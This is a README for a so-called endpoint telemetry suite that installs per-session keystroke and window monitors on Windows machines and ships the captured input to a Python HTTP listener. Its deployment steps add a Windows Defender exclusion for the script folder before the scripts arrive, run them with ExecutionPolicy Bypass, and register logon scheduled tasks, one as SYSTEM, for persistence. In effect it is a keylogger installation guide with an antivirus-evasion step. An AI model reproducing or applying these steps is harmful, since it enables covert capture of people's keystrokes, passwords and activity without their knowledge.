# Endpoint Telemetry Suite

Lightweight endpoint telemetry collector and log server. Captures session, activity, and input events from Windows endpoints and ships them to a central Python HTTP listener.

---

## Components

| File | Role |
|---|---|
| `Create-ScheduledTask.ps1` | Deployment script — run once on the Windows endpoint as Administrator |
| `main.py` | Listener server — run on the collection host |
| `C:\temp\script.ps1` | Written by deploy script — fires at logon |
| `C:\temp\window_monitor.ps1` | Written by deploy script — per-session window tracker |
| `C:\temp\keyboard_monitor.ps1` | Written by deploy script — per-session input capture |

---

## Prerequisites

**Endpoint (Windows)**
- PowerShell 5+
- Administrator rights for initial deployment
- .NET Framework 4.5+ (included in Windows 8.1 / Server 2012 R2 and later)
- Network access to the collection host on port 8080

**Collection host**
- Python 3.6+
- Port 8080 open and reachable from the endpoint

---

## Configuration

Set `$CollectionServer` at the top of `Create-ScheduledTask.ps1` to the URL of the collection host:

```powershell
$CollectionServer = "http://192.168.1.100:8080/"
```

This value is injected into all three endpoint scripts at write time — it only needs to be set in one place.

---

## Deployment

Order matters. The Defender exclusion must be in place before the deployment script is copied to the endpoint.

**Step 1 — on the endpoint, open an elevated PowerShell prompt and run:**
```powershell
Add-MpPreference -ExclusionPath "C:\temp"
```

**Step 2 — copy `Create-ScheduledTask.ps1` into `C:\temp\` on the endpoint, then run:**
```powershell
powershell.exe -ExecutionPolicy Bypass -File "C:\temp\Create-ScheduledTask.ps1"
```

This will:
- Create `C:\temp\` if it does not exist
- Write the three monitoring scripts to `C:\temp\`
- Register three scheduled tasks that activate on next logon

---

## Running the Server

On the collection host:
```bash
python main.py
```

Logs are written to `./logs/` with one file per user per day:
```
logs/USERNAME_YYYY-MM-DD.log
```

All event types (logon, window changes, keystrokes) are written to the same user file so the full session timeline is in one place.

---

## Scheduled Tasks

| Task | Runs As | Trigger |
|---|---|---|
| `LogonNotify` | SYSTEM | At logon |
| `WindowMonitor` | Interactive Users | At logon |
| `KeyboardMonitor` | Interactive Users | At logon |

`LogonNotify` runs as SYSTEM to access WMI and Active Directory. The other two run in the user's own session context, one instance per active session.

---

## Cleanup

To remove all tasks and scripts from the endpoint:
```powershell
Unregister-ScheduledTask -TaskName "LogonNotify","WindowMonitor","KeyboardMonitor" -Confirm:$false
Remove-Item -Path "C:\temp\script.ps1","C:\temp\window_monitor.ps1","C:\temp\keyboard_monitor.ps1" -Force
Remove-MpPreference -ExclusionPath "C:\temp"
```
